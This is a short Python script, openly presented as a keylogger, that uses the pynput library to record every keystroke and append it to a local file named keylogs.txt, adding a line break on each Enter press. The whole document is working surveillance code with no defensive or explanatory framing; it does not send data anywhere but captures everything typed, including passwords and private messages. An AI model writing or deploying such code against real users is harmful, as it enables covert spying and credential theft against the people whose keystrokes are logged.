from pynput.keyboard import Key, Listener

# Function to write the keylogs to a file
def write_to_file(key):
    with open("keylogs.txt", "a") as f:
        f.write(str(key))
        if key == Key.enter:  # Add a new line for each 'Enter' key press
            f.write('\n')

# Function to listen to keystrokes
def on_press(key):
    write_to_file(key)

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()
